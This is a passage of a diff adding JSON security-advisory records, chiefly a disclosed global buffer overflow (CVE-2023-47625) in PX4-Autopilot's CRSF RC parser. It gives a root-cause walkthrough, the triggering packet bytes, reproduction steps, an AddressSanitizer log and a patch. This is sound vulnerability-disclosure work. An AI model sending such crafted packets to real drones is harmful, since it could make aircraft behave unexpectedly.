+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 5,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:N/A:L",
+      "score": 4.4
+    }
+  },
+  {
+    "ghsa_id": "GHSA-qpw7-65ww-wj82",
+    "cve_id": "CVE-2023-47625",
+    "url": "https://api.github.com/repos/PX4/PX4-Autopilot/security-advisories/GHSA-qpw7-65ww-wj82",
+    "html_url": "https://github.com/PX4/PX4-Autopilot/security/advisories/GHSA-qpw7-65ww-wj82",
+    "summary": "[Bug Report] Vulnerable Bug Found in CrsfParser_TryParseCrsfPacket which can trigger Global Buffer Overflow",
+    "description": "### Summary\r\n\r\n---\r\n\r\nWe identified a global buffer overflow vulnerability in the CrsfParser_TryParseCrsfPacket function in /src/drivers/rc/crsf_rc/CrsfParser.cpp:298 due to the invalid size check. \r\n\r\nWe investigated by the following process\r\n\r\n1. Enable the crsf_rc driver\r\n2. Write the data (i.e., packet) to _rcs_buf used in the crsf_rc driver on a device \r\n3. Global buffer overflow vulnerability in the *CrsfParser_TryParseCrsfPacket* function will be triggered when the *CrsfParser_TryParseCrsfPacket* function parses this data.\r\n\r\nThe following packet can trigger the vulnerability as mentioned above.\r\n\r\n```c\r\npacket[0] = 0xc8; // MAGIC NUMBER which informs rc packet start\r\npacket[1] = 62; // size of the packet\r\npacket[2] = 100; // packet type ( random, not the 0x16, 0x14 )\r\n```\r\n\r\n### Detailed Root Cause\r\n\r\n---\r\n\r\nWe first assumed that we can write the arbitrary data into _rcs_buf using the following code.\r\n\r\n- /src/drivers/rc/crsf_rc/CrsfRc.cpp #190 line\r\n\r\n```c\r\nint new_bytes = ::read(_rc_fd, &_rcs_buf[0], RC_MAX_BUFFER_SIZE);\r\n```\r\n\r\nAfter that, CrsfParser_TryParseCrsfPacket will be called and parse the information of the rc packet in _rcs_buf.\r\n\r\n- The CrsfParser_TryParseCrsfPacket function checks the following conditions\r\n1. The first byte of the packet is same with CRSF_HEADER (0xc8). ([CrsfParser.cpp:256](https://github.com/PX4/PX4-Autopilot/blob/d1266c856fbd759cbc6cf583c5221aab49962b30/src/drivers/rc/crsf_rc/CrsfParser.cpp#L256C2-L256C2))\r\n\r\n```c\r\ncase PARSER_STATE_HEADER:\r\n\t\t\tif (QueueBuffer_Get(&rx_queue, &working_byte)) {\r\n\t\t\t\tif (working_byte == CRSF_HEADER) {\r\n\t//...omitted...\r\n```\r\n\r\n1. Whether the type of the packet is known or not.\r\n    - If the packet’s type is not 0x16 or 0x14, then the working_segment_size sets `packet_size(our input) + PACKET_SIZE_TYPE(2);`\r\n2. The working_segment_size should be less or equal than CRSF_MAX_PACKET_LEN which is 64. (if condition in [CrsfParser.cpp:298](https://github.com/PX4/PX4-Autopilot/blob/d1266c856fbd759cbc6cf583c5221aab49962b30/src/drivers/rc/crsf_rc/CrsfParser.cpp#L298))\r\n    - In that case, if we send the packet which sets size as 62, then working_segment_size will be 64, and this corresponds to the if condition (`working_segment_size <= CRSF_MAX_PACKET_LEN`). Because the previous condition added 2 with the size of the packet.\r\n    - It makes to pass this if condition, and working_index will set as 2 consequently.\r\n\r\n```c\r\ncase PARSER_STATE_SIZE_TYPE:\r\n\t\t\t//PX4_INFO(\"PARSER_STATE_SIZE_TYPE\\n\");\r\n\t\t\tQueueBuffer_Peek(&rx_queue, working_index++, &packet_size); //working_index = 1\r\n\t\t\tQueueBuffer_Peek(&rx_queue, working_index++, &packet_type); //working_index = 2\r\n\r\n\t\t\tworking_descriptor = FindCrsfDescriptor((enum CRSF_PACKET_TYPE)packet_type);\r\n\r\n\t\t\t// If we know what this packet is...\r\n\t\t\tif (working_descriptor != NULL) {\r\n\t\t\t\t//.. the packet's type was 0x16 or 0x14\r\n\t\t\t\t//..omitted\r\n\t\t\t\t}\r\n\t\t\t} else {\r\n\t\t\t\t// We don't know what this packet is, so we'll let the parser continue\r\n\t\t\t\t// just so that we can dequeue it in one shot\r\n\t\t\t\tworking_segment_size = packet_size + PACKET_SIZE_TYPE_SIZE; //PACKET_SIZE_TYPE_SIZE : 2\r\n\r\n\t\t\t\tif (working_segment_size > CRSF_MAX_PACKET_LEN) {\r\n\t\t\t\t\tparser_statistics->invalid_unknown_packet_sizes++;\r\n\t\t\t\t\tparser_state = PARSER_STATE_HEADER;\r\n\t\t\t\t\tworking_segment_size = HEADER_SIZE;\r\n\t\t\t\t\tworking_index = 0;\r\n\t\t\t\t\tbuffer_count = QueueBuffer_Count(&rx_queue);\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\tparser_state = PARSER_STATE_PAYLOAD;\r\n\t\t\tbreak;\r\n```\r\n\r\n- Next, in the PARSER_STATE_HEADER part, `working_index += working_segment_size` is conducted. For our case, working_index is 2 because of the previous parsing part, working_idex will be 2 + 64 = 66.\r\n\r\n```c\r\ncase PARSER_STATE_PAYLOAD:\r\n\t\t\tworking_index += working_segment_size;\r\n\t\t\tworking_segment_size = CRC_SIZE;\r\n\t\t\tparser_state = PARSER_STATE_CRC;\r\n\t\t\tbreak;\r\n```\r\n\r\n- The *QueueBuffer_PeekBuffer* function will be called with the 4th parameter represents size as 67 (because CRC_SIZE is 1)\r\n\r\n```c\r\ncase PARSER_STATE_CRC:\r\n\t\t\t// Fetch the suspected packet as a contingous block of memory\r\n\t\t\tQueueBuffer_PeekBuffer(&rx_queue, 0, process_buffer, working_index + CRC_SIZE);\r\n```\r\n\r\n```c\r\nbool QueueBuffer_PeekBuffer(const QueueBuffer_t *q, const uint32_t index, uint8_t *buffer, const uint32_t size)\r\n{\r\n\tuint32_t copy_start;\r\n\r\n\t//...omitted\r\n\r\n\t// Check if we can do this in a single shot\r\n\tif (copy_start + size <= q->buffer_size) {\r\n\t\tmemcpy((void *)buffer, (void *)(q->buffer + copy_start), size); //this will be called\r\n\r\n\t} \r\n```\r\n\r\n- Eventually, the data is copied to process_buffer like this (Our case for [QueueBuffer.cpp:153](https://github.com/PX4/PX4-Autopilot/blob/d1266c856fbd759cbc6cf583c5221aab49962b30/src/drivers/rc/crsf_rc/QueueBuffer.cpp#L153))\r\n\r\n```jsx\r\nmemcpy(process_buffer, data, 67);\r\n```\r\n\r\n- But the initialized size of process_buffer is 64\r\n    \r\n    ```c\r\n    #define CRSF_MAX_PACKET_LEN 64\r\n    static uint8_t process_buffer[CRSF_MAX_PACKET_LEN];\r\n    ```\r\n    \r\n\r\nTherefore, the Global buffer overflow will be triggered.\r\n\r\n### PoC ( Reproduce Method )\r\n\r\n---\r\n\r\nWe want to reproduce this crash using the actual rc packet, but we just triggered this crash in sitl because we don’t have the actual device yet. So, we’ve tested under the situation we can write the arbitrary data in the device using the crsf_rc driver to receive packets.\r\n\r\nSo, we suggest the following process to reproduce this packet.\r\n\r\n1. We set the csrf_rc driver in sitl by modifying the configure of default.px4board.\r\n    \r\n    ```c\r\n    CONFIG_DRIVERS_RC_CRSF_RC=y\r\n    ```\r\n    \r\n2. We set the _rcs_buf buffer (in drivers/crsf_rc/CrsfRc.cpp line 190) as below\r\n    - Assuming that the buffer gets the data.\r\n    \r\n    ```c\r\n    int new_bytes = ::read(_rc_fd, &_rcs_buf[0], RC_MAX_BUFFER_SIZE);\r\n    _rcs_buf[0] = 0xc8; // MAGIC NUMBER which informs rc packet start\r\n    _rcs_buf[1] = 62; // size of the packet ( which is vulnerable )\r\n    _rcs_buf[2] = 100; // packet type ( random, not the 0x16, 0x14 )\r\n    new_bytes = 60 // informs the packet is received\r\n    ```\r\n    \r\n3. We run the crsf_rc driver like this\r\n    \r\n    ```c\r\n    pxh> crsf_rc start -d <device>\r\n    ```\r\n    \r\n    - For example,\r\n    \r\n    ```c\r\n    pxh> crsf_rc start -d /dev/ttyS3\r\n    ```\r\n    \r\n\r\n### Address Sanitizer Log\r\n\r\n---\r\n![Untitled](https://user-images.githubusercontent.com/77731571/268289994-70bda713-6bc3-41d2-aa46-849428489d4f.png)\r\n\r\n```bash\r\n=================================================================\r\n==5090==ERROR: AddressSanitizer: global-buffer-overflow on address 0x563750d9c500 at pc 0x7f15a823a2c3 bp 0x7f15a4606220 sp 0x7f15a46059c8\r\nWRITE of size 67 at 0x563750d9c500 thread T140\r\nERROR [simulator_mavlink] poll timeout 0, 22\r\n    #0 0x7f15a823a2c2 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827\r\n    #1 0x56375022476a in memcpy /usr/include/x86_64-linux-gnu/bits/string_fortified.h:29\r\n    #2 0x56375022476a in QueueBuffer_PeekBuffer(QueueBuffer_t const*, unsigned int, unsigned char*, unsigned int) /home/ubuntu/drone/PX4-Autopilot/src/drivers/rc/crsf_rc/QueueBuffer.cpp:156\r\n    #3 0x563750223952 in CrsfParser_TryParseCrsfPacket(CrsfPacket_t*, CrsfParserStatistics_t*) /home/ubuntu/drone/PX4-Autopilot/src/drivers/rc/crsf_rc/CrsfParser.cpp:330\r\n    #4 0x56375022126d in CrsfRc::Run() /home/ubuntu/drone/PX4-Autopilot/src/drivers/rc/crsf_rc/CrsfRc.cpp:211\r\n    #5 0x563750a44b00 in px4::WorkQueue::Run() /home/ubuntu/drone/PX4-Autopilot/platforms/common/px4_work_queue/WorkQueue.cpp:188\r\n    #6 0x563750a459bc in WorkQueueRunner /home/ubuntu/drone/PX4-Autopilot/platforms/common/px4_work_queue/WorkQueueManager.cpp:238\r\n    #7 0x7f15a7294b42 in start_thread nptl/pthread_create.c:442\r\n    #8 0x7f15a73269ff  (/lib/x86_64-linux-gnu/libc.so.6+0x1269ff)\r\n\r\n0x563750d9c500 is located 32 bytes to the left of global variable 'rx_queue_buffer' defined in '/home/ubuntu/drone/PX4-Autopilot/src/drivers/rc/crsf_rc/CrsfParser.cpp:138:16' (0x563750d9c520) of size 200\r\n0x563750d9c500 is located 0 bytes to the right of global variable 'process_buffer' defined in '/home/ubuntu/drone/PX4-Autopilot/src/drivers/rc/crsf_rc/CrsfParser.cpp:139:16' (0x563750d9c4c0) of size 64\r\nSUMMARY: AddressSanitizer: global-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 in __interceptor_memcpy\r\nShadow bytes around the buggy address:\r\n  0x0ac76a1ab850: f9 f9 f9 f9 00 00 00 00 02 f9 f9 f9 f9 f9 f9 f9\r\n  0x0ac76a1ab860: 00 00 00 00 00 f9 f9 f9 f9 f9 f9 f9 00 00 00 00\r\n  0x0ac76a1ab870: 00 f9 f9 f9 f9 f9 f9 f9 01 f9 f9 f9 f9 f9 f9 f9\r\n  0x0ac76a1ab880: 00 00 00 00 00 f9 f9 f9 f9 f9 f9 f9 00 00 00 00\r\n  0x0ac76a1ab890: 00 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00\r\n=>0x0ac76a1ab8a0:[f9]f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x0ac76a1ab8b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9\r\n  0x0ac76a1ab8c0: f9 f9 f9 f9 00 00 00 f9 f9 f9 f9 f9 04 f9 f9 f9\r\n  0x0ac76a1ab8d0: f9 f9 f9 f9 04 f9 f9 f9 f9 f9 f9 f9 00 00 00 00\r\n  0x0ac76a1ab8e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x0ac76a1ab8f0: 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9\r\nShadow byte legend (one shadow byte represents 8 application bytes):\r\n  Addressable:           00\r\n  Partially addressable: 01 02 03 04 05 06 07 \r\n  Heap left redzone:       fa\r\n  Freed heap region:       fd\r\n  Stack left redzone:      f1\r\n  Stack mid redzone:       f2\r\n  Stack right redzone:     f3\r\n  Stack after return:      f5\r\n  Stack use after scope:   f8\r\n  Global redzone:          f9\r\n  Global init order:       f6\r\n  Poisoned by user:        f7\r\n  Container overflow:      fc\r\n  Array cookie:            ac\r\n  Intra object redzone:    bb\r\n  ASan internal:           fe\r\n  Left alloca redzone:     ca\r\n  Right alloca redzone:    cb\r\n  Shadow gap:              cc\r\nThread T140 created by T5 here:\r\n    #0 0x7f15a8258685 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:216\r\n    #1 0x563750a4608a in WorkQueueManagerRun /home/ubuntu/drone/PX4-Autopilot/platforms/common/px4_work_queue/WorkQueueManager.cpp:324\r\n\r\nThread T5 created by T0 here:\r\n    #0 0x7f15a8258685 in __interceptor_pthread_create ../../../../src/libsanitizer/asan/asan_interceptors.cpp:216\r\n    #1 0x563750a40aab in px4_task_spawn_cmd /home/ubuntu/drone/PX4-Autopilot/platforms/posix/src/px4/common/tasks.cpp:252\r\n\r\n==5090==ABORTING\r\n```\r\n\r\n### Recommend Patch\r\n\r\n---\r\n\r\nAfter the line of CrsfParser.cpp:319, the additional limitations of the size will prevent the bug as mentioned before.\r\n\r\n```c\r\ncase PARSER_STATE_CRC:\r\n\t\t\t// Fetch the suspected packet as a contingous block of memory\r\n\t\t\tif(working_index+CRC_SIZE > CRSF_MAX_PACKET_LEN){\r\n\t\t\t\t  parser_statistics->invalid_unknown_packet_sizes++;\r\n\t\t\t\t\tparser_state = PARSER_STATE_HEADER;\r\n\t\t\t\t\tworking_segment_size = HEADER_SIZE;\r\n\t\t\t\t\tworking_index=0;\r\n\t\t\t\t\tbuffer_count = QueueBuffer_Count(&rx_queue);\r\n\t\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\tQueueBuffer_PeekBuffer(&rx_queue, 0, process_buffer, working_index + CRC_SIZE);\r\n\r\n```\r\n\r\n### Impact\r\n\r\n---\r\n\r\nIf we can create the RC packet remotely and that packet goes into the device where the _rcs_buf reads, the global buffer overflow vulnerability will be triggered so that the drone can behave unexpectedly.",
+    "severity": "low",
+    "author": null,
+    "publisher": {
+      "login": "mrpollo",
+      "id": 317648,
+      "node_id": "MDQ6VXNlcjMxNzY0OA==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/317648?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/mrpollo",
+      "html_url": "https://github.com/mrpollo",
+      "followers_url": "https://api.github.com/users/mrpollo/followers",
+      "following_url": "https://api.github.com/users/mrpollo/following{/other_user}",
+      "gists_url": "https://api.github.com/users/mrpollo/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/mrpollo/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/mrpollo/subscriptions",
+      "organizations_url": "https://api.github.com/users/mrpollo/orgs",
+      "repos_url": "https://api.github.com/users/mrpollo/repos",
+      "events_url": "https://api.github.com/users/mrpollo/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/mrpollo/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-qpw7-65ww-wj82",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2023-47625",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2023-11-13T19:58:06Z",
+    "published_at": "2023-11-13T18:08:06Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "px4-autopilot",
+          "name": ""
+        },
+        "vulnerable_version_range": "1.14.0-rc2",
+        "patched_versions": "1.14.0",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "score": 2.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-120",
+        "name": "Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-120"
+    ],
+    "credits": [
+      {
+        "login": "Pwn9uin",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "Pwn9uin",
+          "id": 77731571,
+          "node_id": "MDQ6VXNlcjc3NzMxNTcx",
+          "avatar_url": "https://avatars.githubusercontent.com/u/77731571?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/Pwn9uin",
+          "html_url": "https://github.com/Pwn9uin",
+          "followers_url": "https://api.github.com/users/Pwn9uin/followers",
+          "following_url": "https://api.github.com/users/Pwn9uin/following{/other_user}",
+          "gists_url": "https://api.github.com/users/Pwn9uin/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/Pwn9uin/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/Pwn9uin/subscriptions",
+          "organizations_url": "https://api.github.com/users/Pwn9uin/orgs",
+          "repos_url": "https://api.github.com/users/Pwn9uin/repos",
+          "events_url": "https://api.github.com/users/Pwn9uin/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/Pwn9uin/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 9,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+      "score": 2.9
+    }
+  }
+]
